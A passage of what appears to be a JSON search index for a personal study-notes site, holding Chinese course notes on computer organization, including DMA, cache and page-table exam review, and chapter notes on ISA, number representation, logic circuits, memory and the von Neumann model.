<li>\u6210\u5757\u6570\u636e\u4f20\u8f93</li> <li>DMA\u7684\u8bf7\u6c42\u4f18\u5148\u7ea7\u6bd4CPU\u9ad8\uff0c\u5982\u679c\u4e0d\u5904\u7406\uff0c\u9ad8\u901f\u8bbe\u5907\u4f1a\u53d1\u751f\u6570\u636e\u4e22\u5931</li> <li>DMA\u5728\u5bfb\u9053\u65cb\u8f6c\u64cd\u4f5c\u7ed3\u675f\u540e\uff0c\u7528\u4e2d\u65ad\u544a\u8bc9CPU\uff0cCPU\u53ef\u4ee5\u6267\u884c\u5176\u4ed6\u7a0b\u5e8f\uff0c\u4e0d\u80fd\u4f7f\u7528\u603b\u7ebf</li> </ul> <p>DMA\u4e0eCPU</p> <ul> <li>CPU\u505c\u6b62\u6cd5</li> <li>\u5468\u671f\u632a\u7528\u6cd5</li> <li>\u4ea4\u66ff\u5206\u65f6\u8bbf\u95ee</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#_9","title":"\u671f\u672b\u590d\u4e60","text":"<ol> <li>sign and magnitude  \u6c42\u7b26\u53f7\u548c\u5927\u5c0f</li> <li>\u6307\u4ee4\u7ffb\u8bd1\u6210\u4e8c\u8fdb\u5236\uff0c\u5bc4\u5b58\u5668\u7684\u5bf9\u5e94\u5173\u7cfb</li> <li>CF \u8fdb\u4f4d OF \u6700\u9ad8\u4f4d</li> <li>callee \u88ab\u8c03\u7528\u8005  caller \u8c03\u7528\u8005</li> <li>routine \u4f8b\u7a0b</li> <li>biased notation \u79fb\u7801\u8868\u793a\u6cd5</li> <li>\u4ec0\u4e48\u662fwrite through  \u5bf9\u4e8e\u4e0d\u540c\u7684\u5904\u7406\u65b9\u6cd5\u8981\u6709\u540d\u79f0\u7684\u8bb0\u5f55</li> <li>\u4e0d\u540c\u7684\u5b58\u50a8\u6750\u6599\u53ca\u5176\u7279\u6027</li> <li>\u6d41\u6c34\u7ebf\u7684\u95ee\u9898</li> <li>\u5b58\u50a8\u5668\u90e8\u5206\u7684\u5404\u79cdcache</li> <li>\u6c47\u7f16\u4ee3\u7801\u7684\u4e66\u5199</li> <li>\u4e8c\u8fdb\u5236\u7684\u5404\u79cd\u7801\u548c\u6d6e\u70b9\u6570\u7684\u8bbe\u8ba1</li> <li>\u591a\u5468\u671fCPU</li> <li> <p>bus\u7684\u4e3b\u8981\u7f3a\u70b9  bus \u603b\u7ebf \u5bf9\u4e8e\u5355\u603b\u7ebf\u800c\u8a00</p> <ul> <li>\u4f18\u70b9\uff1a\u7ed3\u6784\u7b80\u5355\uff0c\u5141\u8bb8 I/O \u8bbe\u5907\u4e4b\u95f4\u6216 I/O \u8bbe\u5907\u4e0e\u4e3b\u5b58\u4e4b\u95f4\u76f4\u63a5\u4ea4\u6362\u4fe1\u606f\uff0cI/O\u8bbe\u5907\u4e0e\u4e3b\u5b58\u4ea4\u6362\u4fe1\u606f\u65f6\uff0c\u539f\u5219\u4e0a\u4e0d\u5f71\u54cdCPU\u7684\u5de5\u4f5c\uff0c\u53ea\u987b CPU\u5206\u914d\u603b\u7ebf\u4f7f\u7528\u6743\uff0c\u4e0d\u9700\u8981 CPU \u5e72\u9884\u4fe1\u606f\u7684\u4ea4\u6362\uff0cCPU\u5de5\u4f5c\u6548\u7387\u6709\u6240\u63d0\u9ad8\u3002</li> <li>\u7f3a\u70b9\uff1a\u7531\u4e8e\u5168\u90e8\u7cfb\u7edf\u90e8\u4ef6\u90fd\u8fde\u63a5\u5728\u4e00\u7ec4\u603b\u7ebf\u4e0a\uff0c\u5404\u90e8\u4ef6\u90fd\u8981\u540c\u65f6\u5360\u7528\u65f6\uff0c\u4f1a\u53d1\u751f\u51b2\u7a81\uff0c\u603b\u7ebf\u7684\u8d1f\u8f7d\u5f88\u91cd\uff0c\u53ef\u80fd\u4f7f\u5176\u541e\u5410\u91cf\u8fbe\u5230\u9971\u548c\u751a\u81f3\u4e0d\u80fd\u80dc\u4efb\u7684\u7a0b\u5ea6\uff0c\u6240\u4ee5\u9700\u8981\u8bbe\u7f6e\u603b\u7ebf\u5224\u4f18\u903b\u8f91\uff0c\u6309\u7167\u4f18\u5148\u7ea7\u9ad8\u4f4e\u6765\u5360\u7528\u603b\u7ebf\uff0c\u5f71\u54cd\u6574\u673a\u5de5\u4f5c\u901f\u5ea6\u3002\u6545\u5927\u591a\u4e3a\u5c0f\u578b\u673a\u548c\u5fae\u578b\u673a\u91c7\u7528\u3002</li> <li>decoder \u7528\u903b\u8f91\u95e8\u600e\u4e48\u5b9e\u73b0  \u7b80\u5355\u7684\u786c\u4ef6\u7684\u903b\u8f91\u95e8\u5b9e\u73b0</li> <li>overflow \u548c carry out\u662f\u4ec0\u4e48</li> <li>\u79fb\u7801\u7684\u8868\u793a   \u8865\u7801\u7684\u6700\u9ad8\u4f4d\u53d6\u53cd</li> <li>\u63a7\u5236\u4fe1\u53f7\u7684\u5177\u4f53\u63a7\u5236</li> <li>cache SRAM \u4e0d\u9700\u8981\u5237\u65b0  memory DRAM \u9700\u8981\u5237\u65b0</li> <li>16KiB  = 4096 words = 16 x 1024 byte = 4 x 1024 x 4bytes = 4096 word</li> <li>\u7ec4\u76f8\u8fde\uff0c\u4e00\u4e2a\u5730\u5740\u88ab\u6620\u5c04\u5230\u552f\u4e00\u7684\u7ec4\u4e0a\uff0c\u8fd9\u4e2a\u7ec4\u4e0a\u6240\u6709\u7684\u4f4d\u7f6e\u90fd\u53ef\u4ee5\u4f7f\u7528\uff0c\u6bcf\u4e2a\u5757\u6709n\u4e2a\u4f4d\u7f6e\u53ef\u653e\u6210\u4e3an-way\u7ec4\u76f8\u8fde  \u7ec4\u76f8\u8fde\u5f80\u5f80\u9009\u62e9\u6700\u8fdc\u88ab\u4f7f\u7528\u7684\u5757\u88ab\u9876\u66ff  \u4ee5\u56db\u8def\u7ec4\u76f8\u8fde\u4e3a\u4f8b\uff0c\u5176\u4e00\u7ec4\u91cc\u7684\u56db\u4e2aword\uff0c\u6bcf\u4e2a\u90fd\u9700\u8981tag\u548cvalid bit</li> <li>page table\u6ca1\u6709tag\uff0c\u662f\u5168\u76f8\u8fde\uff0c\u4e00\u4e2apage\u5bf9\u5e94\u4e00\u4e2avalid bit\uff0c\u4e00\u65e6valid bit\u4e3a0\uff0c\u5219\u7f3a\u5931  \u9664\u4e86page table \u4ee5\u5916\uff0c\u6211\u4eec\u4f1a\u6709\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\u53bb\u8bb0\u5f55\u6bcf\u4e00\u4e2a\u865a\u62dfpage\u5bf9\u5e94\u7684disk address\uff0c\u56e0\u4e3avirtual memory \u5f80\u5f80\u5927\u4e8e\u5b9e\u9645\u7684memory  \u4f8b\u5982\u865a\u62df\u5730\u5740\u4e3a32\u4f4d \u9875\u7684\u5927\u5c0f\u4e3a4KiB = 2 ^ 12bytes  \u9875\u7684\u9879\u6570\u5c31\u662f  2 ^ (32-12)  \u9875\u7684\u6bcf\u9879\u90fd\u662f  32bits = 4bytes   ?\u6b64\u5904\u6709\u7591\u95ee\uff0cpage\u7684\u6bcf\u9879\u5e94\u8be5\u662f\u53ef\u4ee5\u4e0d\u523032bit\uff0c\u56e0\u4e3a\u6620\u5c04\u7684\u4e5f\u662fpage\uff0c\u5b9e\u9645\u5e94\u8be5\u662f\u5185\u5b58\u5730\u5740\u7684\u5bbd\u5ea6\u51cf\u53bb12  \u603b\u5f97\u5927\u5c0f\u5c31\u662f 2 ^ 20 * 4 = 4 MiB</li> <li>page table \u90fd\u662f\u7528write back\uff0c\u6bcf\u4e2apage\u4f1a\u6709\u4e00\u4e2adirty bit  \u5982\u679c\u88ab\u5199\u8fc7\uff0c\u5c31\u53d8\u6210dirty page\uff0c\u5176\u4e0edisk\u7684\u4ea4\u6362\u90fd\u662f\u4ee5\u6574\u4e2apage\u4e3a\u5355\u4f4d\u7684</li> <li>\u5bf9\u4e8epage table \u6211\u4eec\u8bbf\u95ee\u5185\u5b58\u4e24\u6b21\uff0c\u4e00\u6b21\u83b7\u5f97\u7269\u7406\u5730\u5740\uff0c\u4e00\u6b21\u83b7\u5f97\u6570\u636e\uff0c\u540e\u4e00\u6b21\u6211\u4eec\u5df2\u7ecf\u6709cache\u8fdb\u884c\u5904\u7406\uff0c\u524d\u4e00\u6b21\u6211\u4eec\u7528TLB\u8fdb\u884c\u5904\u7406</li> <li>cache \u6700\u540e\u7b97\u51fa\u6765\u8981 \u9664\u4ee58 \u53d8\u6210byte</li> <li>\u4e00\u4e2abyte = 8bit  \u4e00\u4e2aword = 4byte \u56e0\u4e3abyte\u5bfb\u5740 \u6240\u4ee5\u6700\u540e\u4e24\u4f4d\u4e3a0</li> <li>\u4e0d\u7528\u989d\u5916\u7684\u5bc4\u5b58\u5668\u4ea4\u6362\u5185\u5bb9</li> <li>\u5224\u65ad\u6570\u7ec4\u8d8a\u754c\u7684\u6807\u51c6\u505a\u6cd5</li> <li>\u4fdd\u62a4\u4f4d\uff0c\u820d\u5165\u4f4d\uff0c\u7c98\u8d34\u4f4d \u7684\u82f1\u6587</li> <li>\u6240\u6709\u6307\u4ee4\u7684\u5bfb\u5740\u6a21\u5f0f</li> <li>\u6d41\u6c34\u7ebf\u4e0d\u8003\uff1f\u591a\u53d1\u5c04\uff0c\u52a8\u6001\u8c03\u5ea6\u8981\u8003</li> </ul> </li> </ol>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf\u6982\u8bba","text":"<p>\u8ba1\u7b97\u673a\u7cfb\u7edf\u6982\u8bba\u5b66\u4e60\u7b14\u8bb0</p> <p>\u672c\u7bc7\u7b14\u8bb0\u5e76\u4e0d\u5b8c\u6574\uff0c\u56e0\u4e3a\u6211\u6ca1\u6709\u9009\u4e0a\u8ba1\u6982\u6240\u4ee5\u662f\u53bb\u65c1\u542c\u4e86\u8fd9\u95e8\u8bfe\uff0c\u4e5f\u5e76\u4e0d\u662f\u6bcf\u6b21\u8bfe\u90fd\u53bb\u542c\uff0c\u591a\u6570\u60c5\u51b5\u4e0b\u8fd8\u662f\u5728\u770b\u4e66\u81ea\u5b66\u548c\u505alab\uff0c\u8fd9\u7bc7\u7b14\u8bb0\u57fa\u672c\u4e0a\u53ef\u4ee5\u7b49\u4e8e\u8ba1\u6982\u8bfe\u672c\u7684\u8bfb\u4e66\u7b14\u8bb0\u3002\u4e66\u540d\u5c31\u662f\u8fd9\u7bc7\u7b14\u8bb0\u7684\u6807\u9898\uff0c\u8fd9\u672c\u4e66\u975e\u5e38\u63a8\u8350\u9605\u8bfb\uff0c\u5199\u7684\u975e\u5e38\u6e05\u6670\u3002</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#chapter1-welcome-aboard","title":"chapter1 welcome aboard","text":""},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#why-we-learn-it","title":"why we learn it","text":"<p>abstract \u62bd\u8c61\u662f\u4e00\u79cd\u91cd\u8981\u7684\u80fd\u529b\uff0c\u5176\u6548\u679c\u5728\u4e8e\u9690\u53bb\u7ec6\u8282\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u66f4\u8f7b\u677e\u7684\u4f7f\u7528\u548c\u751f\u6d3b \u4f46\u662f\u5b83\u4e5f\u6709\u4e24\u4e2a\u7f3a\u70b9\uff0c\u5982\u679c\u4e0d\u5177\u5907\u4e86\u89e3\u7ec6\u8282\u7684\u80fd\u529b\uff0c\u90a3\u4e48\u53ea\u80fd\u671f\u671b\u4e8e\u5e95\u5c42\u7684\u4e8b\u52a1\u6c38\u4e0d\u51fa\u9519\uff0c\u7b2c\u4e8c\u70b9\uff0c\u5982\u679c\u6211\u4eec\u5e76\u4e0d\u4e86\u89e3\u5e95\u5c42\u5b9e\u73b0\uff0c\u90a3\u4e48\u5c31\u5f88\u96be\u53bb\u5f88\u597d\u5730\u4f7f\u7528\u5b83\u63d0\u4f9b\u7684\u63a5\u53e3</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#level-of-transformation","title":"level of transformation","text":"<p>the instruction set architecture ISA ISA\u7684\u529f\u80fd\u5728\u4e8e\uff0c\u5728\u63cf\u8ff0\u548c\u6267\u884c\u4e4b\u95f4\u5efa\u7acb\u6620\u5c04\u5173\u7cfb</p> <p>what is ISA</p> <p>isa\u662f \u5df2\u7ecf\u7f16\u5199\u7684\u7a0b\u5e8f\u4e0e\u5fc5\u987b\u6267\u884c\u8fd9\u4e9b\u7a0b\u5e8f\u5de5\u4f5c\u7684\u5e95\u5c42\u8ba1\u7b97\u673a\u786c\u4ef6\u4e4b\u95f4\u63a5\u53e3\u7684\u5b8c\u6574\u89c4\u8303 \u79f0\u4e3a\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784</p> <p>isa \u5e2e\u6211\u4eec\u5236\u5b9a\u64cd\u4f5c\u7801\u6570\u91cf(the number of opcodes)\uff0c\u6570\u636e\u7c7b\u578b(data types)\uff0c\u5bfb\u5740\u6a21\u5f0f(addressing modes)\u7b49\u7b49\uff0c\u4e0d\u540c\u7684ISA\u8fd9\u4e9b\u89c4\u5b9a\u4e5f\u5404\u4e0d\u76f8\u540c isa\u662f\u4e00\u79cd\u89c4\u8303\uff0c\u800c\u771f\u6b63\u7684\u5b9e\u73b0\u9700\u8981\u4ee5\u6765\u5fae\u4f53\u7cfb\u7ed3\u6784\uff0c\u6bcf\u4e00\u79cdISA\u7531\u591a\u79cd\u5fae\u4f53\u7cfb\u7ed3\u6784\u5b9e\u73b0</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#chapter2-bitsdata-types-and-operations","title":"chapter2 bits,data types, and operations","text":"<p>bits are binary digits</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#data-types","title":"data types","text":"<p>we have many types including unsigned integers signed integers logical variable float ASCII</p> <p>\u8865\u7801(complement number)\uff1a\u4e3a\u4e86\u65b9\u4fbf\u8ba1\u7b97\u673a\u5185\u7684\u8fd0\u7b97\uff0c\u4e00\u822c\u7528\u8865\u7801\u8868\u793a\u6570\u503c \u8865\u7801\u7684\u8ba1\u7b97\uff1a\u6b63\u6570\u7684\u8865\u7801\u5c31\u662f\u539f\u7801\uff0c\u8d1f\u6570\u9664\u4e86\u7b26\u53f7\u4f4d\u53d6\u53cd\u52a0\u4e00</p> <p>\u6d6e\u70b9\u6570\uff1a\u4ee532\u4f4d\u6d6e\u70b9\u6570\u4e3a\u4f8b\uff0c\u7b2c\u4e00\u4f4d\u4e3asign\u8868\u793a\u7b26\u53f7 \u540e\u9762\u516b\u4f4d \u4e3aexponent\u8868\u793a\u6307\u6570 \u6700\u540e\u976223\u4f4d\u8868\u793afraction \u5c0f\u6570\u70b9\u540e\u5b9e\u9645\u7684\u6570\u503c \u6d6e\u70b9\u6570\u4e2d\u65e0\u9700\u4f7f\u7528\u8865\u7801 \u5728exponent\u4e2d\u4f1a\u52a0\u4e0a127\uff0c\u518d\u628a\u6307\u6570\u8f6c\u4e3a\u4e8c\u8fdb\u5236</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#operations-on-bits","title":"operations on Bits","text":"<p>addition and subtraction</p> <p>SEXT \u5728\u8865\u7801\u539f\u5219\u4e0b\uff0c\u7b26\u53f7\u4f4d\u5411\u9ad8\u4f4d\u6269\u5c55\uff0c\u662f\u4e0d\u4f1a\u5f71\u54cd\u5b9e\u9645\u7684\u6570\u503c\u7684</p> <p>overflow \u6700\u9ad8\u4f4d\u7684\u5b58\u5728\uff0c\u5f53\u8fdb\u4f4d\u4e4b\u540e\u8d85\u8fc7\u4e86\u6700\u9ad8\u4f4d\u5c31\u4f1a\u76f4\u63a5\u628a\u90a3\u4e00\u4f4d\u76f4\u63a5\u4e22\u5f03\u6389 \u5728\u6570\u5b66\u542b\u4e49\u4e0a\uff0c\u7b49\u540c\u4e8e\u53d6\u6a21 \u6bd4\u5982\u5bf9\u4e8e\u4e8c\u8fdb\u5236\u56db\u4f4d\u6570\u7684unsigned integer \u76f8\u5f53\u4e8e\u5bf916\u53d6\u6a21</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#chapter3-digital-logic-structures","title":"chapter3 digital logic structures","text":"<p>\u5fae\u5904\u7406\u5668\u7684\u6784\u6210\u662fMOS\u6676\u4f53\u7ba1 \u6211\u4eec\u6709N\u578b\u6676\u4f53\u7ba1\u548cP\u578b\u6676\u4f53\u7ba1  \u4e24\u8005\u5de5\u4f5c\u6a21\u5f0f\u76f8\u53cd N\u578b\u662f\u57280\u4f0f\u7535\u65f6\u8868\u73b0\u4e3a\u65ad\u8def\uff08\u5f00\u8def\uff09P\u578b\u57280\u4f0f\u7535\u65f6\u8868\u73b0\u4e3a\u95ed\u8def</p> <p>\u6676\u4f53\u7ba1\u7684\u7b2c\u4e00\u6b65\u662f\u7ec4\u6210\u903b\u8f91\u95e8 NOT \u7531\u4e24\u4e2a\u6676\u4f53\u7ba1\u7ec4\u6210 \u4e00\u4e2aP\u578b \u4e00\u4e2aN\u578b</p> <p>NOR and OR</p> <p>\u200b\u200b</p> <p>\u7b2c\u4e8c\u6b65\u662f\u7ec4\u5408\u903b\u8f91\u7535\u8def</p> <p>\u903b\u8f91\u7ed3\u6784\u53ef\u4ee5\u5206\u4e3a\u4e24\u79cd\uff0c\u4e00\u79cd\u5305\u542b\u4fe1\u606f\u5b58\u50a8\uff0c\u4e00\u79cd\u4e0d\u5305\u542b\u4fe1\u606f\u5b58\u50a8</p> <p>\u9996\u5148\u6765\u7814\u7a76\u4e0d\u5b58\u50a8\u4fe1\u606f\u7684\u903b\u8f91\u7535\u8def\uff0c\u6211\u4eec\u8bb0\u4e3a\u7ec4\u5408\u903b\u8f91\u7535\u8def \u5e38\u89c1\u6709\u4e09\u79cd\uff0c\u89e3\u7801\u5668\uff0c\u591a\u8def\u590d\u7528\u5668\uff0c\u4e00\u4f4d\u52a0\u6cd5\u5668</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#_2","title":"\u7ec4\u5408\u903b\u8f91\u7535\u8def","text":"<p>\u89e3\u7801\u5668 decoder</p> <p>\u200b\u200b</p> <p>\u4e00\u4e2a\u53cc\u8f93\u5165\u89e3\u7801\u5668\u7684\u7ed3\u6784\u5982\u4e0a \u5b83\u4f1a\u628aA B\u7684\u6240\u6709\u7ec4\u5408\u8fdb\u884c\u8f93\u51faA&amp;B \u975eA&amp;B A&amp;\u975eB \u975eA&amp;\u975eB \u663e\u7136\u5b83\u4f1a\u6709n\u4e2a\u8f93\u5165\u548c2^n\u4e2a\u8f93\u51fa\uff0c\u4e14\u8fd9\u4e9b\u8f93\u51fa\u4e2d\u4ec5\u6709\u4e00\u4e2a\u4e3a\u771f</p> <p>\u89e3\u7801\u5668\u53ef\u4ee5\u7528\u4e8e\u786e\u5b9a\u5982\u4f55\u89e3\u91ca\u4f4d\u6a21\u5f0f</p> <p>\u591a\u8def\u590d\u7528\u5668 mux</p> <p>\u200b\u200b</p> <p>\u591a\u8def\u590d\u7528\u5668\u7684\u4f5c\u7528\u662f\u5f53\u6709\u591a\u4e2a\u8f93\u5165\u7684\u65f6\u5019\uff0c\u7528\u8fc7s\u8fd9\u4e2a\u8f93\u5165\u6765\u63a7\u5236\u6700\u540e\u5230\u5e95\u53d6\u54ea\u4e2a\u8f93\u5165 \u4f5c\u4e3a\u8f93\u51fa \u6211\u4eec\u5c06s\u79f0\u4e3a\u9009\u62e9\u4fe1\u53f7\uff08select signal\uff09 s\u7684\u8f93\u5165\u4e2a\u6570\u51b3\u5b9a\u4e86\u5b83\u53ef\u4ee5\u63a7\u5236\u7684\u8f93\u5165\u4e2a\u6570</p> <p>\u4e00\u4f4d\u52a0\u6cd5\u5668\uff08\u5168\u52a0\u5668\uff09Full Adder</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u6709\u4e24\u4e2a\u64cd\u4f5c\u6570\uff0cA\u548cB\uff0c C\u662f\u6765\u81ea\u4e0a\u4e00\u4f4d\u7684\u8fdb\u4f4d</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#_3","title":"\u57fa\u672c\u5b58\u50a8\u5143\u4ef6","text":"<p>the R-S latch</p> <p>\u4e00\u6b21\u53ef\u4ee5\u5b58\u50a8\u4e00\u4f4d\u4fe1\u606f \u53730\u62161\uff0c\u5176\u672c\u8eab\u6709\u591a\u79cd\u5b9e\u73b0\u65b9\u5f0f</p> <p>\u200b\u200b</p> <p>the gated D latch</p> <p>\u200b\u200b</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#concept-of-memory","title":"concept of memory","text":"<p>\u6211\u4eec\u5c06\u552f\u4e00\u53ef\u8bc6\u522b\u7684\u4f4d\u7f6e\u7684\u603b\u6570\uff0c\u79f0\u4e3a\u5185\u5b58\u7684\u5730\u5740\u63a7\u5236\u5b89</p> <p>\u6bd4\u5982\u6211\u4eec\u67092GB\u7684\u5185\u5b58\uff0c\u5373\u6211\u4eec\u7684\u6bcf\u4e2a\u5730\u5740\u90fd\u662f\u53ef\u4ee5\u6839\u636e31\u4f4d\u53bb\u5bfb\u5740\u7684\uff0c\u4e5f\u5373\u6211\u4eec\u67092^31\u7684\u5730\u5740\u7a7a\u95f4 \u5927\u591a\u6570\u8ba1\u7b97\u673a\u800c\u8a00\uff0c\u6bcf\u4e2a\u5730\u5740\u7a7a\u95f4\u7684\u4f4d\u7f6e\u5305\u542b\u4e00\u4e2a\u516b\u5b57\u8282\u7684\u5b58\u50a8</p> <p>addressability \u53ef\u5bfb\u5740\u6027 the number of bits stored in each memory location is the memory's addressability</p> <p>\u4e00\u4e2a2GB\u5185\u5b58\u7684\u7535\u8111\u67092^31\u4e2a\u4f4d\u7f6e\uff0c\u6bcf\u4e2a\u4f4d\u7f6e\u5305\u542b8\u4e2abits</p> <p>A 2**2-by-3-Bit Memory</p> <p>\u8fd9\u662f\u4e00\u4e2a\u4f8b\u5b50\u5e2e\u6211\u4eec\u7406\u89e32^2 \u7684\u5185\u5b58 \u548c 3 \u7684\u53ef\u5bfb\u5740\u6027\u7684\u5b58\u50a8\u5668\uff0c\u6765\u5e2e\u6211\u4eec\u7406\u89e3\u4e0a\u8ff0\u6982\u5ff5 \u67092x2\u4e2a\u5730\u5740\uff0c\u5176\u6bcf\u4e2a\u5730\u5740\u9700\u89812bits\u53bbspecify\u5b83\u7684\u5730\u5740\uff0c\u7136\u540e\u67093\u7684addressability\uff0c\u6240\u4ee5 \u6bcf\u4e2a\u5730\u5740\u67093bits\u7684\u7a7a\u95f4</p> <p>\u200b\u200b</p> <p>what's the meaning of \"bottom word line is asserted\"</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#sequential-logic-circuits","title":"sequential logic circuits","text":"<p>\u8fd9\u662f\u4e00\u79cd\u7279\u6b8a\u903b\u8f91\u7535\u8def\uff0c\u7ec4\u5408\u4e86\u524d\u9762\u4e24\u79cd\u57fa\u672c\u7684\u5143\u4ef6 \u4f7f\u5176\u65e2\u53ef\u4ee5\u5904\u7406\u4fe1\u606f\uff0c\u53c8\u53ef\u4ee5\u5b58\u50a8\u4fe1\u606f\uff0c\u4e0d\u6b62\u57fa\u4e8e\u5f53\u524d\u8f93\u5165\uff0c\u8fd8\u57fa\u4e8e\u5386\u53f2\u8f93\u5165</p> <p>\u200b\u200b</p> <p>\u62bd\u8c61\u7684\u601d\u8def\u5982\u4e0a</p> <p>sequential logic circuits\u7528\u4e8e\u5b9e\u73b0\u4e00\u79cd\u91cd\u8981\u7684\u7ed3\u6784\uff0ccalled finite state machines\u6709\u9650\u72b6\u6001\u673a</p> <p>the concept of state\u72b6\u6001\u7684\u6982\u5ff5</p> <p>\u7528\u4e00\u4e2a\u4f8b\u5b50\u6765\u8bf4\u660e\uff0c\u5047\u8bbe\u6709\u4e00\u4e2a\u9501\uff0c\u9700\u8981A B C \u56db\u4e2a\u52a8\u4f5c\u987a\u5e8f\u5b8c\u6210\u624d\u80fd\u6253\u5f00 \u90a3\u4e48\u8fd9\u4e2a\u9501\u5c31\u6709\u51e0\u79cd\u72b6\u6001\uff0c \u65e0\u52a8\u4f5c \u505a\u4e86A\u52a8\u4f5c \u505a\u4e86A B\u52a8\u4f5c \u505a\u4e86A B C\u52a8\u4f5c\uff08\u9501\u5f00\uff09</p> <p>the set of states \u8868\u793a\u4e86\u91cc\u9762\u6240\u6709\u53ef\u80fd\u7684\u72b6\u6001\u7684\u5feb\u7167</p> <p>\u200b\u200b</p> <p>synchronous and asynchronous \u540c\u6b65\u548c\u5f02\u6b65</p> <p>\u4e0a\u8ff0\u8ba8\u8bba\u7684\u7b80\u5355\u4f8b\u5b50\u662f\u5f02\u6b65\u7684 \u800c\u8ba1\u7b97\u673a\u662f\u540c\u6b65\u7684</p> <p>\u5bf9\u4e8e\u4e0a\u8ff0\u4f8b\u5b50\u800c\u8a00\uff0c\u72b6\u6001\u548c\u72b6\u6001\u4e4b\u95f4\u7684\u5207\u6362\u4e0d\u5b58\u5728\u56fa\u5b9a\u7684\u65f6\u95f4\uff0c\u4e5f\u5c31\u662f\u8bf4\u8fde\u7eed\u7684\u72b6\u6001\u5207\u6362\u4e4b\u95f4\u7684\u65f6\u95f4\u662f\u4e0d\u56fa\u5b9a\u7684\uff0c\u8fd9\u79f0\u4e3a\u5f02\u6b65</p> <p>\u800c\u8ba1\u7b97\u673a\u5185\u90e8\u5b58\u5728\u4e00\u4e2a\u65f6\u949f\u7535\u8def,\u4e5f\u5373clock circuit\uff0c\u4f7f\u5f97\u5176\u6bcf\u4e00\u6b21\u72b6\u6001\u5207\u6362\u7684\u65f6\u95f4\u7684\u786e\u5b9a\u7684</p> <p>\u6211\u4eec\u4e5f\u4e3e\u4e00\u4e2a\u4f8b\u5b50\u8fdb\u884c\u8bb2\u8ff0</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#chapter4-the-von-neumann-model","title":"chapter4 the von neumann model","text":"<p>von neumann model consists of five parts: memory,  a processing unit, input, output, a control unit</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#introduction-to-these-parts-in-von-model","title":"introduction to these parts in von model","text":"<p>memory</p> <p>\u7c7b\u4f3c\u4e8e\u524d\u9762\u6240\u63d0\u5230\u76842^2^ by 3bits \u7684\u5185\u5b58\u6a21\u5f0f \u73b0\u5728\u7684\u8ba1\u7b97\u673a\u7684\u5185\u5b58\u57fa\u672c\u90fd\u662f2^34^ by 8 bits \u7684\u6a21\u5f0f \u4e5f\u5373\u6211\u4eec\u8981\u627e\u5230\u90a3\u4e2a\u5185\u5b58\u9700\u8981\u4e00\u4e2a34\u4f4d\u7684\u5730\u5740 \u7136\u540e\u6bcf\u4e2a\u5185\u5b58\u5730\u5740\u4e0a\u6709\u7740\u4e00\u4e2a8bits \u7684\u7a7a\u95f4\uff0c\u6211\u4eec\u901a\u5e38\u53c8\u628a8bits\u79f0\u4e3a\u4e00\u5b57\u8282 \u5bfb\u5740\u80fd\u529b\u662f8  \u5730\u5740\u7a7a\u95f4\u662f34  </p> <p>LC-3\u76842^16^ by 16bits</p> <p>\u8bbf\u95ee\u5185\u5b58\u7684\u7b2c\u4e00\u6b65\u662f\u8bfb\u5199\u64cd\u4f5c \u8bfb\uff1a \u5148\u5c06\u8981\u8bbf\u95ee\u7684\u5185\u5b58\u5355\u5143\u7684\u5730\u5740\u6570\u636e\u653e\u5230MAR\uff08\u5185\u5b58\u5730\u5740\u5bc4\u5b58\u5668\uff09\u4e0a\uff0c\u7136\u540e\u53d1\u9001\u8bf7\u6c42\uff0c\u628a\u8be5\u5730\u5740\u7684\u6570\u636e\u5b58\u653e\u5230MDR\uff08\u5185\u5b58\u6570\u636e\u5bc4\u5b58\u5668\uff09\u4e0a\uff0c\u8fdb\u884c\u8bfb\u53d6 